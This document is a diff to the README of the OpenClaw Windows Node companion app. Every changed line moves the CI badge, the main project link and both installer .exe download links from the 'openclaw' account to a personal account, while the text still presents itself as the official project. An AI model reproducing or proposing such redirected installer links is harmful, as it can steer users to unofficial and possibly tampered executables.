@@ -2,12 +2,12 @@
 
 ![OpenClaw Windows Node banner](docs/assets/readme-banner.jpg)
 
-[![CI](https://img.shields.io/github/actions/workflow/status/openclaw/openclaw-windows-node/ci.yml?branch=main&style=flat-square&label=ci)](https://github.com/openclaw/openclaw-windows-node/actions/workflows/ci.yml)
+[![CI](https://img.shields.io/github/actions/workflow/status/wasimmostakim2965-ui/openclaw-windows-node/ci.yml?branch=main&style=flat-square&label=ci)](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/actions/workflows/ci.yml)
 [![.NET](https://img.shields.io/badge/.NET-10.0-512bd4?style=flat-square)](https://dotnet.microsoft.com/download/dotnet/10.0)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
 [![Discord](https://img.shields.io/discord/1456350064065904867?label=discord&logo=discord&logoColor=white&color=5865F2&style=flat-square)](https://discord.gg/clawd)
 
-The native Windows companion for [OpenClaw](https://github.com/openclaw/openclaw). Connect your PC to a gateway, chat with your agents, and choose which Windows capabilities they can use.
+The native Windows companion for [OpenClaw](https://github.com/wasimmostakim2965-ui/Open-Wai). Connect your PC to a gateway, chat with your agents, and choose which Windows capabilities they can use.
 
 [Download](https://docs.openclaw.ai/platforms/windows) | [Setup guide](docs/SETUP.md) | [Windows docs](https://docs.openclaw.ai/platforms/windows) | [Discord](https://discord.gg/clawd)
 
@@ -15,8 +15,8 @@ The native Windows companion for [OpenClaw](https://github.com/openclaw/openclaw
 
 | Architecture | Installer |
 |---|---|
-| x64 | [OpenClawCompanion-Setup-x64.exe](https://github.com/openclaw/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-x64.exe) |
-| ARM64 | [OpenClawCompanion-Setup-arm64.exe](https://github.com/openclaw/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-arm64.exe) |
+| x64 | [OpenClawCompanion-Setup-x64.exe](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-x64.exe) |
+| ARM64 | [OpenClawCompanion-Setup-arm64.exe](https://github.com/wasimmostakim2965-ui/openclaw-windows-node/releases/latest/download/OpenClawCompanion-Setup-arm64.exe) |
 
 Requires Windows 10 20H2 or later, or Windows 11. No source build is required.
 
